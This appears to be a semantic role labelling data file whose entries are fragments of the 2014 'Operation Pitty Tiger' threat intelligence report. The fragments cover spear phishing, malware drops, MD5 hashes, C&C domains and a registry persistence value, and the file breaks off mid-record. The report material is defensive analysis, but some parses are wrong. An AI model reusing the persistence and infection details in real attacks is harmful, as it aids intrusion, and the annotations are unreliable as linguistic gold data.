     Login\n               ->C:PC-XXX\n               ->U:User-XXX\n               ->L:10.10.10.1\n               ->S:Microsoft Windows XP Service Pack 3 5.1 2600\n               ->M:Nov 13 2013\n               ->P:1033\n</figure>\n\n    It contains the computer name, the user name, the internal IP address, the OS version, the RAT\n    internal version and the Language ID of the system": {"contains": {"ARG0": {"text": "It"}, "V": {"text": "contains", "index": 1}, "ARG1": {"text": "the computer name , the user name , the internal IP address , the OS version , the RAT internal version and the Language ID of the system"}}}, " It drops the \u201cpacket64.dll\u201d, and\n    injects it in \u201cexplorer.exe\u201d": {"drops": {"ARG0": {"text": "It"}, "V": {"text": "drops", "index": 1}, "ARG1": {"text": "the \u201c packet64.dll \u201d"}}, "injects": {"ARG0": {"text": "It"}, "V": {"text": "injects", "index": 8}, "ARG1": {"text": "it"}, "ARG2": {"text": "in \u201c explorer.exe"}}}, " When\n    opened, it shows a single line written in Chinese language, which can be translated as \u201cHello!\u201d\n\n\n\n<figure></figure>\n                          <caption>Microsoft Office Word decoy \u201ctest document\u201d used by the Pitty Tiger group</caption>\n</section>\n<section>\n    <heading>Installation</heading>\n\n    When successfully triggered, the exploit infects the host by dropping and executing a file named\n    \u201csvohost.exe\u201d<fn>2</fn> in the temporary folder of the currently logged-in user:\n\n<footnote>\n    1\n     MD5 hash: e70c0479cdb9aa031a263740365e7939\n    2\n     MD5 hash: 1752aacc08ee0acd58405e9bc10b0dbb\n</footnote>\n<footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 12/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n\n<list>\n                      C:\\DOCUME~1\\USER\\LOCALS~1\\Temp\\svohost.exe\n</list>\n\n    This binary is \u201cTroj/ReRol.A\u201d according to Sophos naming convention<fn>1</fn>": {"opened": {"ARGM-TMP": {"text": "When"}, "V": {"text": "opened", "index": 1}}, "shows": {"ARGM-TMP": {"text": "When opened"}, "ARG0": {"text": "it"}, "V": {"text": "shows", "index": 4}, "ARG1": {"text": "a single line written in Chinese language , which can be translated as \u201c Hello"}}, "written": {"ARG1": {"text": "a single line"}, "V": {"text": "written", "index": 8}, "ARGM-LOC": {"text": "in Chinese language"}}, "can": {"V": {"text": "can", "index": 14}}, "be": {"V": {"text": "be", "index": 15}}, "translated": {"ARG1": {"text": "a single line written in Chinese language"}, "R-ARG1": {"text": "which"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "translated", "index": 16}, "ARGM-MNR": {"text": "as \u201c Hello"}}}, " The trick\n    is to target the right victim and provide it with the right content, so that they will click on a link leading\n    to drive-by download of a malware, or open an attached file which will infect their computer": {"is": {"ARG1": {"text": "The trick"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "to target the right victim and provide it with the right content , so that they will click on a link leading to drive - by download of a malware , or open an attached file which will infect their computer"}}, "target": {"V": {"text": "target", "index": 4}, "ARG1": {"text": "the right victim"}, "ARGM-PRP": {"text": "so that they will click on a link leading to drive - by download of a malware , or open an attached file which will infect their computer"}}, "provide": {"V": {"text": "provide", "index": 9}, "ARG2": {"text": "it"}, "ARG1": {"text": "with the right content"}, "ARGM-PRP": {"text": "so that they will click on a link leading to drive - by download of a malware , or open an attached file which will infect their computer"}}, "will": {"V": {"text": "will", "index": 19}}, "click": {"ARG0": {"text": "they"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "click", "index": 20}, "ARG1": {"text": "on a link leading to drive -"}, "ARGM-MNR": {"text": "by download of a malware"}}, "leading": {"ARG0": {"text": "a link"}, "V": {"text": "leading", "index": 24}, "ARG2": {"text": "to drive"}}, "drive": {"V": {"text": "drive", "index": 26}}, "open": {"ARG0": {"text": "they"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "open", "index": 35}, "ARG1": {"text": "an attached file which will infect their computer"}}, "will_2": {"ARG0": {"text": "an attached file"}, "R-ARG1": {"text": "which"}, "V": {"text": "will", "index": 40}, "ARG2": {"text": "infect their computer"}}, "infect": {"ARG0": {"text": "an attached file"}, "R-ARG0": {"text": "which"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "infect", "index": 41}, "ARG1": {"text": "their computer"}}}, "\n\n    They generally create archive files containing the content they want to exfiltrate, which are then sent\n    to the attackers by using a remote administration tool (RAT) or transfer protocols such as FTP and\n    HTTP": {"create": {"ARG0": {"text": "They"}, "ARGM-ADV": {"text": "generally"}, "V": {"text": "create", "index": 2}, "ARG1": {"text": "archive files"}, "ARGM-PRD": {"text": "containing the content they want to exfiltrate , which are then sent to the attackers by using a remote administration tool ( RAT ) or transfer protocols such as FTP and HTTP"}}, "containing": {"ARG0": {"text": "archive files"}, "V": {"text": "containing", "index": 5}, "ARG1": {"text": "the content they want to exfiltrate , which are then sent to the attackers by using a remote administration tool ( RAT ) or transfer protocols such as FTP and HTTP"}}, "want": {"ARG0": {"text": "they"}, "V": {"text": "want", "index": 9}, "ARG1": {"text": "to exfiltrate"}}, "exfiltrate": {"ARG1": {"text": "the content"}, "ARG0": {"text": "they"}, "V": {"text": "exfiltrate", "index": 11}}, "are": {"V": {"text": "are", "index": 14}}, "sent": {"ARG1": {"text": "exfiltrate"}, "R-ARG1": {"text": "which"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "sent", "index": 16}, "ARG2": {"text": "to the attackers"}, "ARGM-MNR": {"text": "by using a remote administration tool ( RAT ) or transfer protocols such as FTP and HTTP"}}, "using": {"V": {"text": "using", "index": 21}, "ARG1": {"text": "a remote administration tool ( RAT ) or transfer protocols such as FTP and HTTP"}}}, " The data is sent encrypted with\n    RC4, and base64-encoded": {"is": {"V": {"text": "is", "index": 2}}, "sent": {"ARG1": {"text": "The data"}, "V": {"text": "sent", "index": 3}, "ARGM-ADV": {"text": "encrypted"}}, "encrypted": {"ARG1": {"text": "The data"}, "V": {"text": "encrypted", "index": 4}, "ARGM-MNR": {"text": "with RC4"}}, "base64-encoded": {"ARG1": {"text": "The data"}, "V": {"text": "base64-encoded", "index": 9}}}, " It just takes a few lines of code in the infecting script\n    to only compromise visitors coming from the target IP ranges": {"takes": {"ARGM-ADV": {"text": "just"}, "V": {"text": "takes", "index": 2}, "ARG1": {"text": "a few lines of code"}, "ARG2": {"text": "in the infecting script/ to only compromise visitors coming from the target IP ranges"}}, "compromise": {"V": {"text": "compromise", "index": 14}, "ARG0": {"text": "visitors"}}, "coming": {"ARG1": {"text": "only compromise visitors"}, "V": {"text": "coming", "index": 16}, "ARG2": {"text": "from the target IP ranges"}}, "ranges": {"ARG1": {"text": "the target IP"}, "V": {"text": "ranges", "index": 21}}}, "\n\n    Spear phishing can be described as targeted e-mail phishing": {"can": {"V": {"text": "can", "index": 2}}, "be": {"V": {"text": "be", "index": 3}}, "described": {"ARG1": {"text": "Spear phishing"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "described", "index": 4}, "ARG2": {"text": "as targeted e - mail phishing"}}, "targeted": {"V": {"text": "targeted", "index": 6}, "ARG1": {"text": "e - mail phishing"}}}, "\n\n    Pitty Tiger also seem to use fake Microsoft Office Excel content, yet we could only find empty\n    content delivering once again the Troj/ReRol.A malware": {"seem": {"ARGM-ADV": {"text": "also"}, "V": {"text": "seem", "index": 3}, "ARG1": {"text": "to use fake Microsoft Office Excel content"}}, "use": {"ARG0": {"text": "Pitty Tiger"}, "V": {"text": "use", "index": 5}, "ARG1": {"text": "fake Microsoft Office Excel content"}}, "could": {"V": {"text": "could", "index": 14}}, "find": {"ARG0": {"text": "we"}, "ARGM-MOD": {"text": "could"}, "ARGM-ADV": {"text": "only"}, "V": {"text": "find", "index": 16}, "ARG1": {"text": "empty content delivering once again the Troj / ReRol . A malware"}}, "delivering": {"ARG0": {"text": "empty content"}, "V": {"text": "delivering", "index": 19}, "ARGM-TMP": {"text": "once again"}, "ARG1": {"text": "the Troj / ReRol . A malware"}}}, "\n\n<figure></figure>\n\n\n                              <caption>IP addresses used by the 50PZ80C-1DFDCB8 machine</caption>\n\n\n    <footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 42/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n\n\n\n    The two computers FLY-THINK and 50PZ80C-1DFDCB8 have used distinct IP addresses to\n    connect to the c&c, yet some of these IP addresses come from the same IP range:\n\n<figure></figure>\n\n\n                          <caption>IP ranges overlapping between two machines used by the attackers</caption>\n\n    We mapped these RDP connections to have a graphical view:\n\n\n\n\n   <footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 43/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n\n<figure></figure>\n                                     <caption>RDP connections from the attackers to one c&c server</caption>\n\n</section>\n<section>\n          <heading>\u201cTOOT\u201d</heading>\n\n    We found that a member of this group of attackers used some tools on his own system, for testing\n    purposes": {"found": {"ARG0": {"text": "We"}, "V": {"text": "found", "index": 1}, "ARG1": {"text": "that a member of this group of attackers used some tools on his own system , for testing purposes"}}, "used": {"ARG0": {"text": "a member of this group of attackers"}, "V": {"text": "used", "index": 10}, "ARG1": {"text": "some tools"}, "ARG2": {"text": "on his own system/ for testing purposes"}}}, "\n\n    Interestingly enough, we saw a part of these documents appear on Virus-Total, with an additional\n    \u201cgift\u201d from the attackers, a payload dropping a malware": {"saw": {"ARGM-ADV": {"text": "Interestingly enough"}, "ARG0": {"text": "we"}, "V": {"text": "saw", "index": 4}, "ARG1": {"text": "a part of these documents appear on Virus - Total , with an additional \u201c gift \u201d from the attackers , a payload dropping a malware"}}, "appear": {"ARG1": {"text": "a part of these documents"}, "V": {"text": "appear", "index": 10}, "ARGM-LOC": {"text": "on Virus - Total"}, "ARGM-PRD": {"text": "with an additional \u201c gift \u201d from the attackers , a payload dropping a malware"}}, "dropping": {"ARG0": {"text": "a payload"}, "V": {"text": "dropping", "index": 28}, "ARG1": {"text": "a malware"}}}, "\n    The communication protocol is quite simple: GET requests are used to receive data from the c&c,\n    and POST requests to send data": {"is": {"ARG1": {"text": "The communication protocol"}, "V": {"text": "is", "index": 3}, "ARG2": {"text": "quite simple"}}, "GET": {"V": {"text": "GET", "index": 7}, "ARG1": {"text": "requests are used to receive data from the c&c , and POST requests to send data"}}, "are": {"ARG1": {"text": "requests"}, "V": {"text": "are", "index": 9}, "ARG2": {"text": "used to receive data from the c&c , and POST requests to send data"}}, "used": {"ARG1": {"text": "requests"}, "V": {"text": "used", "index": 10}, "ARG2": {"text": "to receive data from the c&c , and POST requests to send data"}}, "receive": {"V": {"text": "receive", "index": 12}, "ARG1": {"text": "data"}, "ARG2": {"text": "from the c&c"}}, "send": {"V": {"text": "send", "index": 22}, "ARG1": {"text": "data"}}}, "\n\n    The attackers have been using different vulnerability scanners aimed at their targets": {"have": {"V": {"text": "have", "index": 2}}, "been": {"V": {"text": "been", "index": 3}}, "using": {"ARG0": {"text": "The attackers"}, "V": {"text": "using", "index": 4}, "ARG1": {"text": "different vulnerability scanners aimed at their targets"}}, "aimed": {"ARG1": {"text": "different vulnerability scanners"}, "V": {"text": "aimed", "index": 8}, "ARG2": {"text": "at their targets"}}}, "\n\n    Unlike others c&c binaries, the c&c part of this RAT does not have a graphical interface, but can be\n    remotely requested to manage the bots": {"does": {"V": {"text": "does", "index": 11}}, "have": {"ARGM-ADV": {"text": "Unlike others c&c binaries"}, "ARG0": {"text": "the c&c part of this RAT"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "have", "index": 13}, "ARG1": {"text": "a graphical interface"}}, "can": {"V": {"text": "can", "index": 19}}, "be": {"V": {"text": "be", "index": 20}}, "requested": {"ARGM-ADV": {"text": "Unlike others c&c binaries"}, "ARG1": {"text": "the c&c part of this RAT/ to manage the bots"}, "ARGM-MOD": {"text": "can"}, "ARGM-MNR": {"text": "remotely"}, "V": {"text": "requested", "index": 22}}, "manage": {"ARG0": {"text": "the c&c part of this RAT"}, "V": {"text": "manage", "index": 24}, "ARG1": {"text": "the bots"}}}, "\n\n\n<footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 14/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n\n\n    Here is an anonymized sample of communication showing information collected by the malware:\n<figure>\n              HostName :xxx\n              UserName :xxx\n              SysType :32bit\n\n              Windows 7 Enterprise Service Pack 1 6.1 7601\n              Organization:\n              Owner:xxx\n\n              --------------Server Info-------------------\n              - AdobeARMservice\n              - Adobe Acrobat Update Service\n              - AeLookupSvc\n              - Application Experience\n              - AudioEndpointBuilder\n              - \u2026 (list goes on)\n\n              --------------Soft Info-------------------\n                     1   Adobe AIR 4.0.0.1390\n                     2   Adobe Shockwave Player 12.0 12.0.9.149\n                     3   FileZilla Client 3.7.4.1 3.7.4.1\n                     4   Mozilla Thunderbird 24.3.0 (x86 en-US) 24.3.0\n                     5   \u2026 (list goes on)\n\n\n              --------------IP Config-------------------\n              Adapt Type: Ethernet\n              NetCardNum:       11\n              NetCard Name:     {XXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}\n              Description :     Realtek RTL8139C+ Fast Ethernet NIC\n              MAC-ADDR:         XX-XX-XX-XX-XX-XXX\n              IP-Addr:          10.xxx.xxx.xxx\n              IP-Mask:          255.255.255.0\n              GateWay:          10.xxx.xxx.xxx\n              DHCP Serv:        1\n              DHCP Host:        10.xxx.xxx.xxx\n              WINS Serv:        0\n              WINS PriHost:\n              WINS SecHost:\n</figure>\n                                 <caption>Sample information collected by Troj/ReRol.A malware</caption>\n\n\n    This information is very useful for an attacker: it shows all software installed on the system, and\n    running services": {"is": {"ARG1": {"text": "This information"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "very useful for an attacker"}}, "shows": {"ARG0": {"text": "it"}, "V": {"text": "shows", "index": 10}, "ARG1": {"text": "all software installed on the system"}}, "installed": {"ARG1": {"text": "all software"}, "V": {"text": "installed", "index": 13}, "ARG2": {"text": "on the system"}}}, " The IP is\n    in an ADSL dynamic pool in the Gangzhou area (Guangdong province):\n\n\n\n\n   <footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 40/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n\n<figure></figure>\n\n                                          <caption>IP address used by CHMXY-PC</caption>\n\n    A few connections to the c&c were done by a computer named TIEWEISHIPC with IP address\n    27.16.139.143": {"is": {"ARG1": {"text": "The IP"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "in an ADSL dynamic pool in the Gangzhou area ( Guangdong province )"}}, "were": {"V": {"text": "were", "index": 23}}, "done": {"ARG1": {"text": "A few connections to the c&c"}, "V": {"text": "done", "index": 24}, "ARG0": {"text": "by a computer named TIEWEISHIPC"}, "ARGM-MNR": {"text": "with IP address 27.16.139.143"}}, "named": {"ARG1": {"text": "a computer"}, "V": {"text": "named", "index": 28}, "ARG2": {"text": "TIEWEISHIPC"}}}, " This vulnerability which exists on some old\n    versions of OpenSSL allows attackers to collect data from chunks of memory from the targeted\n    machine": {"exists": {"ARG1": {"text": "This vulnerability"}, "R-ARG1": {"text": "which"}, "V": {"text": "exists", "index": 3}, "ARGM-LOC": {"text": "on some old versions of OpenSSL"}}, "allows": {"ARG0": {"text": "This vulnerability which exists on some old versions of OpenSSL"}, "V": {"text": "allows", "index": 10}, "ARG1": {"text": "attackers to collect data from chunks of memory from the targeted machine"}}, "collect": {"ARG0": {"text": "attackers"}, "V": {"text": "collect", "index": 13}, "ARG1": {"text": "data"}, "ARG2": {"text": "from chunks of memory from the targeted machine"}}, "targeted": {"V": {"text": "targeted", "index": 21}, "ARG1": {"text": "machine"}}}, " First requests are\n    used to check for updates (GET request on /httpdocs/update/update.ini)": {"are": {"V": {"text": "are", "index": 2}}, "used": {"V": {"text": "used", "index": 3}, "ARG2": {"text": "for updates ( GET request on /httpdocs"}}, "check": {"V": {"text": "check", "index": 5}, "ARG2": {"text": "for updates ("}}, "GET": {"V": {"text": "GET", "index": 9}, "ARG1": {"text": "request on /httpdocs / update / update.ini )"}}}, "\n\n    Our sample uses \u201cmca.avstore.com.tw\u201d, \u201cstar.yamn.net\u201d and \u201cbz.kimoo.com.tw\u201d as c&c servers": {"uses": {"ARG0": {"text": "Our sample"}, "V": {"text": "uses", "index": 2}, "ARG1": {"text": "\u201c mca.avstore.com.tw \u201d"}}}, "\n\n    Persistence is achieved by adding the path to the binary to the WinlogonUserInit key:\n<list>\n              Key Path: \\REGISTRY\\USER\\<SID>\\Software\\Microsoft\\Windows\n              NT\\CurrentVersion\\Winlogon\n              Value Name: UserInit\n              Value: C:\\WINDOWS\\system32\\userinit.exe,C:\\WINDOWS\\system32\\qmgrxp.exe,\n</list>\n\n    The \u201cpacket64.dll\u201d is the main payload of the RAT": {"is": {"V": {"text": "is", "index": 1}}, "achieved": {"ARG1": {"text": "Persistence"}, "V": {"text": "achieved", "index": 2}, "ARGM-MNR": {"text": "by adding the path to the binary to the WinlogonUserInit key"}}, "adding": {"V": {"text": "adding", "index": 4}, "ARG1": {"text": "the path"}, "ARGM-DIR": {"text": "to the"}, "ARG2": {"text": "binary to the WinlogonUserInit key"}}, "is_2": {"ARG1": {"text": "The \u201c packet64.dll \u201d"}, "V": {"text": "is", "index": 19}, "ARG2": {"text": "the main payload of the RAT"}}}, " In a spear phishing scheme, attackers\n    send very few e-mails to targeted people": {"phishing": {"V": {"text": "phishing", "index": 3}, "ARG0": {"text": "scheme"}}, "send": {"ARGM-LOC": {"text": "In a spear phishing scheme"}, "ARG0": {"text": "attackers"}, "V": {"text": "send", "index": 7}, "ARG1": {"text": "very few e - mails"}, "ARGM-PRP": {"text": "to targeted people"}}, "targeted": {"V": {"text": "targeted", "index": 14}, "ARG1": {"text": "people"}}}, "\n       \uf0b7 Someone from another company has been targeted with this document": {"has": {"V": {"text": "has", "index": 5}}, "been": {"V": {"text": "been", "index": 6}}, "targeted": {"ARG2": {"text": "Someone from another company"}, "V": {"text": "targeted", "index": 7}, "ARG1": {"text": "with this document"}}}, " He could also gain\n    the credentials to a sensitive e-mail account": {"could": {"V": {"text": "could", "index": 1}}, "gain": {"ARG0": {"text": "He"}, "ARGM-MOD": {"text": "could"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "gain", "index": 3}, "ARG1": {"text": "the credentials to a sensitive e - mail account"}}}, " This is another remote administration\n    tool often used by the Pitty Tiger crew": {"is": {"ARG1": {"text": "This"}, "V": {"text": "is", "index": 1}, "ARG2": {"text": "another remote administration tool often used by the Pitty Tiger crew"}}, "used": {"ARG1": {"text": "another remote administration tool"}, "ARGM-TMP": {"text": "often"}, "V": {"text": "used", "index": 7}, "ARG0": {"text": "by the Pitty Tiger crew"}}}, "\n    They need to install several different backdoors in order to be able to always access the network": {"need": {"ARG0": {"text": "They"}, "V": {"text": "need", "index": 1}, "ARG1": {"text": "to install several different backdoors in order to be able to always access the network"}}, "install": {"ARG0": {"text": "They"}, "V": {"text": "install", "index": 3}, "ARG1": {"text": "several different backdoors"}, "ARGM-PRP": {"text": "in order to be able to always access the network"}}, "be": {"V": {"text": "be", "index": 10}, "ARG2": {"text": "able to always access the network"}}, "access": {"ARGM-TMP": {"text": "always"}, "V": {"text": "access", "index": 14}, "ARG1": {"text": "the network"}}}, "\n</section>\n<section>\n    <heading>Exploitation</heading>\n\n    We have been able to find one such document<fn>1</fn> used by that group of attacker, exploiting CVE-\n    2012-0158, an old critical vulnerability impacting Microsoft Office and corrected by Microsoft\u2019s\n    MS12-027 fix in April 2012": {"used": {"V": {"text": "used", "index": 0}, "ARG0": {"text": "by that group of attacker , exploiting CVE- 2012 - 0158 , an old critical vulnerability impacting Microsoft Office and corrected by Microsoft \u2019s"}}, "exploiting": {"V": {"text": "exploiting", "index": 7}, "ARG1": {"text": "CVE- 2012 - 0158"}}, "impacting": {"ARG0": {"text": "an old critical vulnerability"}, "V": {"text": "impacting", "index": 17}, "ARG1": {"text": "Microsoft Office"}}, "corrected": {"ARG1": {"text": "an old critical vulnerability"}, "V": {"text": "corrected", "index": 21}, "ARG0": {"text": "by Microsoft \u2019s"}}}, "\n</section>\n<section>\n    <heading>Installation</heading>\n\n    The malware<fn>1</fn>, when running in our sandbox, triggers the following alarms:\n\n<figure></figure>\n\n\n                           <caption>Alarms in our sandbox system, triggered by the PittyTiger malware</caption>\n\n\n\n    The binary drops two files in \u201cC:\\Windows\\System32\u201d:\n\n\n<footnote>\n    1\n        MD5 hash : be18418cafdb9f86303f7e419a389cc9\n</footnote>\n<footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 16/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n\n<figure></figure>\n\n                                 <caption>Files dropped by the PittyTiger RAT in our sandbox</caption>\n\n    The \u201cqmgrxp.exe\u201d binary is a simple copy of the original binary": {"is": {"ARG1": {"text": "The \u201c qmgrxp.exe \u201d binary"}, "V": {"text": "is", "index": 5}, "ARG2": {"text": "a simple copy of the original binary"}}}, "\n\n    Pitty Tiger is effective and mature in the use of targeted malware, the use of known exploits to infect\n    computers with their malware and the creation of an infrastructure to efficiently conduct APT attacks": {"is": {"ARG1": {"text": "Pitty Tiger"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "effective and mature"}, "ARGM-LOC": {"text": "in the use of targeted malware"}, "ARGM-PRD": {"text": "the use of known exploits to infect computers with their malware and the creation of an infrastructure to efficiently conduct APT attacks"}}, "targeted": {"V": {"text": "targeted", "index": 10}, "ARG1": {"text": "malware"}}, "known": {"V": {"text": "known", "index": 16}, "ARG1": {"text": "exploits"}}, "infect": {"V": {"text": "infect", "index": 19}, "ARG1": {"text": "computers"}, "ARGM-MNR": {"text": "with their malware"}}, "conduct": {"ARGM-MNR": {"text": "efficiently"}, "V": {"text": "conduct", "index": 32}, "ARG1": {"text": "APT attacks"}}}, " Every visitor of the compromised third party is then infected": {"compromised": {"V": {"text": "compromised", "index": 4}, "ARG1": {"text": "party"}}, "is": {"V": {"text": "is", "index": 7}}, "infected": {"ARG1": {"text": "Every visitor of the compromised third party"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "infected", "index": 9}}}, "\n</section>\n<section>\n        <heading>Malware families</heading>\n\n    Six malware families have been identified as communicating with subdomains of skypetm.com.tw:\n<list>\n        -    MM RAT\n        -    Pitty Tiger RAT\n        -    Troj/ReRol.A\n        -    CT RAT\n        -    Paladin\n        -    Exadog\n</list>\n<table>\n                     MD5                                     Malware family                          C&C server\n    81fa811f56247c236566d430ae4798eb                            MM RAT                          ms11.skypetm.com.tw\n    55e456339936a56c73a7883ea1ddb672                     Backdoor:Win32/Ptiger.A               botemail.skypetm.com.tw\n    d5da60d678d5a55a847e1e6723c7a4d0                     Backdoor:Win32/Ptiger.A                 aniu.skypetm.com.tw\n    0750569cf1733d4fbb01169476387cc2                     Backdoor:Win32/Ptiger.A                 aniu.skypetm.com.tw\n                                                                                                zeng.skypetm.com.tw\n    abb0abfab252e4bfb9106273df3c1c2                      Backdoor:Win32/Ptiger.A                 aniu.skypetm.com.tw\n                                                                                                zeng.skypetm.com.tw\n    c0656b66b9f4180e59e1fd2f9f1a85f2                           Troj/Rerol.A                     zeng.skypetm.com.tw\n    ce15fa3338b7fe780e85c511d5e49a98                           Troj/Rerol.A                     zeng.skypetm.com.tw\n    8a54adb3976d1c03605656ca55be7400                     Backdoor:Win32/Ptiger.A                super.skypetm.com.tw\n    a1ea6dc12b983c7262fe76c1b3663b24                     Backdoor:Win32/Ptiger.A                qinoo.skypetm.com.tw\n    b6380439ff9ed0c6d45759da0f3b05b8                       Troj/Rerol.A dropper                sophos.skypetm.com.tw\n    5e2360a8c4a0cce1ae22919d8bff49fd                           Troj/ReRol.A                    sophos.skypetm.com.tw\n    79e48961d1ee982a466d222671a42ccb                           Troj/ReRol.A                    sophos.skypetm.com.tw\n    4ab74387f7a02c115deea2110f961fd3                             ReRol.A                       sophos.skypetm.com.tw\n    bf95e89906b8a17fd611002660ffff32                           Troj/ReRol.A                    sophos.skypetm.com.tw\n    CONTAINS VICTIM INFORMATION                     Office Word file - Rerol.A dropper         sophos.skypetm.com.tw\n    4ce8593c9de2b27b5c389f651c81638b                             CT RAT                        newb02.skypetm.com.tw\n    8df89df484ca5c376b763479ea08d036                             Paladin                       newb02.skypetm.com.tw\n    22e47c5e3809a4150d0db7fc99a68cc0                    Office Excel file \u2013 Rerol.A             margo.skypetm.com.tw\n                                                                 dropper\n    dd87c68c1e71bb104a48a6be87a2349f                     Backdoor:Win32/Ptiger.A                ripper.skypetm.com.tw\n    068870c2c165a1d29fc2f3d3edfed3ae                        Win32/Exadog.AA                       link.skypetm.com.tw\n    Unknown                                              Backdoor:Win32/Ptiger.A                 asdf.skypetm.com.tw\n</table>\n\n   <footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 33/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n<figure></figure>\n\n\n                                   <caption>Skypetm.com.tw infrastructure: subdomains and malware linked to it</caption>\n\n<table>\n\n    Hosting Company       Geolocalisation        IP Range            IP Address          C&C server                Timeline\n\n\n    Take 2 Hosting Inc": {"server": {"ARG0": {"text": "C&C"}, "V": {"text": "server", "index": 8}}, "Take": {"ARG0": {"text": "Hosting Company Geolocalisation IP Range IP Address C&C server Timeline"}, "V": {"text": "Take", "index": 10}, "ARG1": {"text": "2 Hosting Inc"}}}, " To build a watering hole attack, attackers do compromise the website of a third party,\n    generally a supplier of the target, which is typically visited by a specific group of professionals and\n    very likely by the target": {"build": {"V": {"text": "build", "index": 1}, "ARG1": {"text": "a watering hole attack"}, "ARG0": {"text": "attackers"}}, "watering": {"V": {"text": "watering", "index": 3}, "ARG0": {"text": "hole attack"}}, "do": {"V": {"text": "do", "index": 8}}, "compromise": {"R-ARG0": {"text": "To build a watering hole attack"}, "ARG0": {"text": "attackers"}, "V": {"text": "compromise", "index": 9}, "ARG1": {"text": "the website of a third party , generally a supplier of the target , which is typically visited by a specific group of professionals and very likely by the target"}}, "is": {"V": {"text": "is", "index": 25}}, "visited": {"ARG1": {"text": "the"}, "R-ARG1": {"text": "which"}, "ARGM-ADV": {"text": "typically"}, "V": {"text": "visited", "index": 27}, "ARG0": {"text": "by a specific group of professionals and very likely by the target"}}}, "\n\n    He launched some tests with the CT RAT we exposed earlier:\n\n\n<figure></figure>\n\n                          <caption>User \u201cToot\u201d logging on the CT RAT on machine \u201ctoot-2a601225a8\u201d, 2014/02/10</caption>\n\n\n\n\n    <footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 44/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n<figure></figure>\n\n\n                          <caption>User \u201cToot\u201d logging on the CT RAT on machine \u201ctoot-2a601225a8\u201d, 2014/04/09</caption>\n\n<figure></figure>\n\n\n\n                          <caption>User \u201cToot\u201d logging on the CT RAT on machine \u201ctoot-2a601225a8\u201d, 2014/04/09</caption>\n\n\n\n    Here we can see a user \u201cToot\u201d from a machine named \u201ctoot-2a601225a8\u201d logging in the CT RAT\n    and executing some commands": {"launched": {"ARG0": {"text": "He"}, "V": {"text": "launched", "index": 1}, "ARG1": {"text": "some tests"}, "ARGM-MNR": {"text": "with the CT RAT we exposed earlier"}}, "exposed": {"ARG1": {"text": "the CT RAT"}, "ARG0": {"text": "we"}, "V": {"text": "exposed", "index": 9}, "ARGM-TMP": {"text": "earlier"}}, "can": {"V": {"text": "can", "index": 14}}, "see": {"ARGM-LOC": {"text": "Here"}, "ARG0": {"text": "we"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "see", "index": 15}, "ARG1": {"text": "a user \u201c Toot \u201d from a machine named \u201c toot-2a601225a8 \u201d logging in the CT RAT and executing some commands"}}, "named": {"ARG1": {"text": "a machine"}, "V": {"text": "named", "index": 24}, "ARG2": {"text": "\u201c toot-2a601225a8 \u201d logging in the CT RAT"}}, "executing": {"ARG0": {"text": "we"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "executing", "index": 34}, "ARG1": {"text": "some commands"}}}, "\n\n    We discovered this malware sample in June 2014, leading to a command & control (c&c) server still\n    in activity": {"discovered": {"ARG0": {"text": "We"}, "V": {"text": "discovered", "index": 1}, "ARG1": {"text": "this malware sample in June 2014"}, "C-ARG1": {"text": "leading to a command & control ( c&c"}}, "leading": {"ARG0": {"text": "this malware sample"}, "V": {"text": "leading", "index": 9}, "ARG2": {"text": "to a command & control ( c&c ) server still in activity"}}}, "\n\n    After these tests, we could see some real connections to a victim using this RAT": {"could": {"V": {"text": "could", "index": 5}}, "see": {"ARGM-TMP": {"text": "After these tests"}, "ARG0": {"text": "we"}, "ARGM-MOD": {"text": "could"}, "V": {"text": "see", "index": 6}, "ARG1": {"text": "some real connections to a victim using this RAT"}}, "using": {"V": 